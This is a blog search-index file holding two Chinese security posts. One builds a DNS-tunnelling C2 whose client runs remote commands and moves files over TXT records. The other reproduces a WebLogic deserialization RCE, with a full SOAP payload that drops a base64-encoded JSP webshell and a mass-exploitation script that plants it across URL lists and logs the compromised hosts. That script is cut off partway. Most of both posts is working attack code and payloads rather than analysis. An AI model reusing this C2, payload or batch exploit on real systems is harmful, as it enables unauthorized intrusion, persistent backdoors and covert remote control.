<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>一个很像cxk的dns_c2</title>
      <link href="/posts/126651c2.html"/>
      <url>/posts/126651c2.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>算是一个很像cxk的东西，有个BUG一直解决不了<br>而且还时不时的像报错。。。。emmmm<br><img src="http://img4.imgtn.bdimg.com/it/u=1940277742,2702113996&amp;fm=26&amp;gp=0.jpg" alt=""></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>五一之前在sec-wiki看到某文章<br>传送门:<img src="https://www.cnblogs.com/LittleHann/p/8656621.html" alt="DNS Tunnel隧道隐蔽通信实验 &amp;&amp; 尝试复现特征向量化思维方式检测"><br>根据文章所描述的，我这个c2应该属于第一种</p><p>我在写之前上GitHub搜了一下dns shell找到了一个不错的项目<br>传送门:<img src="https://github.com/ahhh/Reverse_DNS_Shell/" alt="DNS_Shell"></p><p>根据上面项目所用到的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnslib模块 --- 处理dns包</span><br><span class="line">dnspython --- 发送dns请求</span><br></pre></td></tr></table></figure></p><p>当然你也可以用scapy手动构造一个dns的数据包然后在发送出去….</p><p>项目里面接收dns包的时候是用socket创建一个UDP，然后监听53端口，监听数据<br>获取到的数据使用dnslib，模块进行解包便可获得想要的数据</p><p>dns_shell算是个反向shell，必须由客户端发送请求。服务端回应该数据<br>虽然写的时候有点困难。我是实现第一种c2，使用的是TXT记录类型。TXT类型有限制数据不能大于63个字节<br>所以必须得分段发送</p><h2 id="实现他"><a href="#实现他" class="headerlink" title="实现他"></a>实现他</h2><p><b>Server端</b><br>解dns包的函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnsj</span><span class="params">(self,data)</span>:</span></span><br><span class="line">    dr=dnslib.DNSRecord.parse(data) <span class="comment">#dns数据包转换</span></span><br><span class="line">    answer=dr.reply() <span class="comment">#获取全部数据</span></span><br><span class="line">    <span class="keyword">return</span> answer,dr.questions[<span class="number">0</span>].qname.label[<span class="number">0</span>] <span class="comment">#获取请求前的dns包和指定数据</span></span><br></pre></td></tr></table></figure></p><p>打包为dns包的函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnsc</span><span class="params">(self,answer,data)</span>:</span></span><br><span class="line">    answer.add_answer(*dnslib.RR.fromZone(<span class="string">'&#123;&#125;.com 60 TXT'</span>.format(data)))</span><br><span class="line">    <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure></p><p>主要函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> s,address</span><br><span class="line">       he = [<span class="string">'cmd---&gt;命令行交互'</span>,<span class="string">'upload---&gt;文件上传'</span>,<span class="string">'download---&gt;文件下载'</span>,<span class="string">'exit---&gt;退出'</span>]</span><br><span class="line">       hps=&#123;<span class="string">'cmd'</span>: self.cmd,<span class="string">'upload'</span>:self.upload,<span class="string">'download'</span>:self.download,<span class="string">'exit'</span>:exit&#125;</span><br><span class="line">       s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">       s.bind((self.host,int(self.port)))</span><br><span class="line">       data,address=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">       print(<span class="string">'[+] 来源IP:&#123;&#125;,来源端口:&#123;&#125;'</span>.format(address[<span class="number">0</span>],address[<span class="number">1</span>]))</span><br><span class="line">       dnsj=self.dnsj(data)</span><br><span class="line">       demo=self.jiemi(dnsj[<span class="number">1</span>])</span><br><span class="line">       <span class="keyword">if</span> demo:</span><br><span class="line">           print(<span class="string">'[+] &#123;&#125;:&#123;&#125;&lt;----&gt;&#123;&#125;:&#123;&#125;'</span>.format(self.host,self.port,address[<span class="number">0</span>],address[<span class="number">1</span>]))</span><br><span class="line">           print(<span class="string">'+请执行你的操作，如果有问题请输入help'</span>)</span><br><span class="line">           demos=self.jiami(<span class="string">'demo'</span>)</span><br><span class="line">           fs=self.dnsc(dnsj[<span class="number">0</span>],demos)</span><br><span class="line">           s.sendto(fs.pack(),address)</span><br><span class="line">           <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">               xw=input(<span class="string">'Jarvis:'</span>)</span><br><span class="line">               <span class="keyword">if</span> xw <span class="keyword">in</span> hps:</span><br><span class="line">                   <span class="keyword">try</span>:</span><br><span class="line">                       hps[xw]()</span><br><span class="line">                   <span class="keyword">except</span> Exception <span class="keyword">as</span> r:</span><br><span class="line">                       print(<span class="string">'-- Error:&#123;&#125;'</span>.format(r))</span><br><span class="line">               <span class="keyword">elif</span> xw==<span class="string">'help'</span>:</span><br><span class="line">                   print(<span class="string">''</span>)</span><br><span class="line">                   <span class="keyword">for</span> h <span class="keyword">in</span> he:</span><br><span class="line">                       print(h)</span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   print(<span class="string">'-没有这种操作'</span>)</span><br><span class="line">                   <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p><p><b>Client端</b><br>主要函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beikon</span><span class="params">(self)</span>:</span></span><br><span class="line">       hk=&#123;<span class="string">'cmd'</span>:self.cmd,<span class="string">'upload'</span>:self.upload,<span class="string">'download'</span>:self.download&#125;</span><br><span class="line">       demo=<span class="string">'demo'</span></span><br><span class="line">       demo=self.jiami(demo)</span><br><span class="line">       bbc=self.fs(demo)</span><br><span class="line">       kk=self.zz(bbc)</span><br><span class="line">       jm=self.jiemi(kk.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">       <span class="keyword">if</span> jm:</span><br><span class="line">           <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">               <span class="keyword">try</span>:</span><br><span class="line">                   g=<span class="string">'ok'</span></span><br><span class="line">                   demo = self.jiami(g)</span><br><span class="line">                   bbc = self.fs(demo)</span><br><span class="line">                   kk = self.zz(bbc)</span><br><span class="line">                   jm = self.jiemi(kk.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                   <span class="keyword">if</span> jm <span class="keyword">in</span> hk:</span><br><span class="line">                       hk[jm]()</span><br><span class="line">               <span class="keyword">except</span>:</span><br><span class="line">                   <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p><b>对应功能对照的函数</b><br>命令行交互<br>server端<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(self)</span>:</span></span><br><span class="line">       self.ok(<span class="string">'cmd'</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">           jb, jc = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">           dnsj = self.dnsj(jb)</span><br><span class="line">           demo = self.jiemi(dnsj[<span class="number">1</span>])</span><br><span class="line">           <span class="keyword">if</span> demo!=<span class="string">'cmd'</span> <span class="keyword">and</span> demo !=<span class="string">'long'</span>:</span><br><span class="line">               print(demo)</span><br><span class="line">               demos = self.jiami(<span class="string">'cmd'</span>)</span><br><span class="line">               fs = self.dnsc(dnsj[<span class="number">0</span>], demos)</span><br><span class="line">               s.sendto(fs.pack(), jc)</span><br><span class="line">           <span class="keyword">elif</span> demo==<span class="string">'long'</span>:</span><br><span class="line">               changdu=<span class="number">0</span></span><br><span class="line">               jg=<span class="string">b''</span></span><br><span class="line">               demos = self.jiami(<span class="string">'long'</span>)</span><br><span class="line">               fs = self.dnsc(dnsj[<span class="number">0</span>], demos)</span><br><span class="line">               s.sendto(fs.pack(), jc)</span><br><span class="line"></span><br><span class="line">               c,d= s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">               dnsj = self.dnsj(c)</span><br><span class="line">               demo=self.jiemi(dnsj[<span class="number">1</span>])</span><br><span class="line">               <span class="keyword">if</span> str(demo).isdigit()==<span class="keyword">True</span>:</span><br><span class="line">                   changdu+=int(demo)</span><br><span class="line">               print(changdu)</span><br><span class="line">               demos = self.jiami(<span class="string">'&#123;&#125;'</span>.format(changdu))</span><br><span class="line">               fs = self.dnsc(dnsj[<span class="number">0</span>], demos)</span><br><span class="line">               s.sendto(fs.pack(), d)</span><br><span class="line">               <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">                   d,e = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">                   dnsj = self.dnsj(d)</span><br><span class="line">                   jg+=dnsj[<span class="number">1</span>]</span><br><span class="line">                   <span class="keyword">if</span> len(jg)==changdu:</span><br><span class="line">                       jmk=self.jiemi(jg)</span><br><span class="line">                       print(jmk)</span><br><span class="line">                       fs = self.dnsc(dnsj[<span class="number">0</span>], <span class="string">'break'</span>)</span><br><span class="line">                       s.sendto(fs.pack(), e)</span><br><span class="line">                       <span class="keyword">break</span></span><br><span class="line">                   demos = self.jiami(<span class="string">'jx'</span>)</span><br><span class="line">                   fs = self.dnsc(dnsj[<span class="number">0</span>], demos)</span><br><span class="line">                   s.sendto(fs.pack(), e)</span><br><span class="line"></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               shell=input(<span class="string">'Jarvis_shell:'</span>)</span><br><span class="line">               <span class="keyword">if</span> shell==<span class="string">'exit'</span>:</span><br><span class="line">                   demos = self.jiami(<span class="string">'exit'</span>)</span><br><span class="line">                   fs = self.dnsc(dnsj[<span class="number">0</span>], demos)</span><br><span class="line">                   s.sendto(fs.pack(), jc)</span><br><span class="line">                   <span class="keyword">break</span></span><br><span class="line">               demos = self.jiami(shell)</span><br><span class="line">               fs = self.dnsc(dnsj[<span class="number">0</span>], demos)</span><br><span class="line">               s.sendto(fs.pack(), jc)</span><br></pre></td></tr></table></figure></p><p>client端<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        g=<span class="string">'cmd'</span></span><br><span class="line">        demo = self.jiami(g)</span><br><span class="line">        bbc = self.fs(demo)</span><br><span class="line">        kk = self.zz(bbc)</span><br><span class="line">        jm = self.jiemi(kk.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">if</span> jm == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zx=os.popen(jm)</span><br><span class="line">            <span class="keyword">if</span> zx:</span><br><span class="line">                g=zx.read()</span><br><span class="line">                demos = self.jiami(g)</span><br><span class="line">                <span class="keyword">if</span> len(demos)&lt;<span class="number">64</span>:</span><br><span class="line">                    <span class="keyword">if</span> len(demos)==<span class="number">0</span>:</span><br><span class="line">                        demos=self.jiami(jm)</span><br><span class="line">                    bbc = self.fs(demos)</span><br><span class="line">                    kk = self.zz(bbc)</span><br><span class="line">                    jm = self.jiemi(kk.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    <span class="keyword">if</span> jm:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    g=<span class="string">'long'</span></span><br><span class="line">                    demo = self.jiami(g)</span><br><span class="line">                    bbc = self.fs(demo)</span><br><span class="line">                    kk = self.zz(bbc)</span><br><span class="line">                    jm = self.jiemi(kk.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    <span class="keyword">if</span> jm:</span><br><span class="line">                        g = len(demos)</span><br><span class="line">                        demo = self.jiami(g)</span><br><span class="line">                        bbc = self.fs(demo)</span><br><span class="line">                        kk = self.zz(bbc)</span><br><span class="line">                        jm = self.jiemi(kk.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                        <span class="keyword">if</span> jm:</span><br><span class="line">                            b=<span class="number">0</span></span><br><span class="line">                            e=<span class="number">32</span></span><br><span class="line">                            <span class="keyword">for</span> u <span class="keyword">in</span> demos:</span><br><span class="line">                                g=demos[b:e]</span><br><span class="line">                                b+=<span class="number">32</span></span><br><span class="line">                                e+=<span class="number">32</span></span><br><span class="line">                                bbc=self.fs(g)</span><br><span class="line">                                kk = self.zz(bbc)</span><br><span class="line">                                <span class="keyword">if</span> kk==<span class="string">'break'</span>:</span><br><span class="line">                                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><b>仓库地址</b>:<a href="https://github.com/422926799/python/tree/master/dns_c2" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/dns_c2</a></p><h2 id="测试截图"><a href="#测试截图" class="headerlink" title="测试截图"></a>测试截图</h2><p><img src="https://s2.ax1x.com/2019/05/02/ENMlz4.md.gif" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/02/ENM8y9.md.gif" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/02/ENMGLR.md.gif" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/02/ENMYe1.md.gif" alt=""></p><p><b>抓包截图</b><br><img src="https://s2.ax1x.com/2019/05/02/ENMtdx.md.gif" alt=""></p><p>转载请声明:转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>weblogic新反序列化rce复现</title>
      <link href="/posts/8b237c5b.html"/>
      <url>/posts/8b237c5b.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>据说又有新的weblogic反序列化爆出来了？滑稽<br>既然如此我来蹭波热度<br><img src="https://s2.ax1x.com/2019/04/26/EnlrIx.png" alt=""></p><p><b>BGM:女王蜂</b></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=549680151&auto=1&height=66"></iframe><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>根据此文章进行复现:<a href="https://www.jianshu.com/p/c4982a845f55" target="_blank" rel="noopener">https://www.jianshu.com/p/c4982a845f55</a></p><p><b>环境准备</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用vulhub里的CVE-2017-10271进行复现</span><br><span class="line">进入对应的文件夹执行docker-compose up -d</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/26/En3SnH.png" alt=""></p><p>访问<a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a><br><img src="https://s2.ax1x.com/2019/04/26/En3DC6.png" alt=""></p><p>根据上面的文章一开始请求:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.241.132:7001/_async/AsyncResponseService</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/26/En8pxU.md.png" alt=""><br>如果页面如上图所示，表示可能存在漏洞</p><p>根据文章中的写webshell第一种方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.241.132:7001</span><br><span class="line">Content-Length: 1383</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshells.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/26/EnGllT.md.png" alt=""></p><p>测试是否成功getshell<br><img src="https://s2.ax1x.com/2019/04/26/EnGong.png" alt=""></p><h3 id="批量检测脚本"><a href="#批量检测脚本" class="headerlink" title="批量检测脚本"></a>批量检测脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:九世</span></span><br><span class="line"><span class="comment">#time:2019/4/26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span>  monkey;monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Weblogic</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,headers,data,path)</span>:</span></span><br><span class="line">        self.headers=headers</span><br><span class="line">        self.data=data</span><br><span class="line">        self.path=path</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        urls=<span class="string">'&#123;&#125;&#123;&#125;'</span>.format(str(url).rstrip(<span class="string">'/'</span>).strip(),self.path)</span><br><span class="line">        urls2=<span class="string">'&#123;&#125;&#123;&#125;'</span>.format(str(url).rstrip(<span class="string">'/'</span>).strip(),<span class="string">'/_async/webshells.jsp'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rqt=requests.get(url=urls,headers=self.headers)</span><br><span class="line">            <span class="keyword">if</span> rqt.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">'Test page'</span> <span class="keyword">in</span> rqt.text:</span><br><span class="line">                rvt=requests.post(url=urls,headers=self.headers,data=self.data,timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">if</span> rvt.status_code==<span class="number">202</span>:</span><br><span class="line">                    rbt=requests.get(url=urls2,headers=headers)</span><br><span class="line">                    <span class="keyword">if</span> rbt.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">'404'</span> <span class="keyword">in</span> rbt.text:</span><br><span class="line">                        print(<span class="string">'[+] weblogic反序列化漏洞利用成功,ip:&#123;&#125; password:&#123;&#125; 利用方式如:&#123;&#125;'</span>.format(urls2,<span class="string">'123'</span>,<span class="string">'&#123;&#125;?pwd=123&amp;cmd=whoami'</span>.format(urls2)))</span><br><span class="line">                        print(<span class="string">'[+] weblogic反序列化漏洞利用成功,ip:&#123;&#125; password:&#123;&#125; 利用方式如:&#123;&#125;'</span>.format(urls2, <span class="string">'123'</span>,<span class="string">'&#123;&#125;?pwd=123&amp;cmd=whoami'</span>.format(urls2)),file=open(<span class="string">'save.txt'</span>,<span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">'[-] 利用失败 url:&#123;&#125; 状态码:&#123;&#125;'</span>.format(rbt.url,rbt.status_code))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] 利用失败 url:&#123;&#125; 状态码:&#123;&#125;'</span>.format(rvt.url,rvt.status_code))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] 不存在weblogic反序列化漏洞-CVE-2019-48814 http状态码:&#123;&#125; url:&#123;&#125;'</span>.format(rqt.status_code,urls))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">xc</span><span class="params">(self,rw)</span>:</span></span><br><span class="line">        xs=[]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> rw:</span><br><span class="line">            xs.append(gevent.spawn(self.exploit,r))</span><br><span class="line"></span><br><span class="line">        gevent.joinall(xs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">djc</span><span class="params">(self,id)</span>:</span></span><br><span class="line">        url_list=[]</span><br><span class="line">        calc=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> str(id)==<span class="string">'1'</span>:</span><br><span class="line">            print(<span class="string">'[+] 单个url检测'</span>)</span><br><span class="line">            xw=input(<span class="string">'url&gt;'</span>)</span><br><span class="line">            self.exploit(url=xw)</span><br><span class="line">        <span class="keyword">elif</span> str(id)==<span class="string">'2'</span>:</span><br><span class="line">            print(<span class="string">'[+] 批量检测'</span>)</span><br><span class="line">            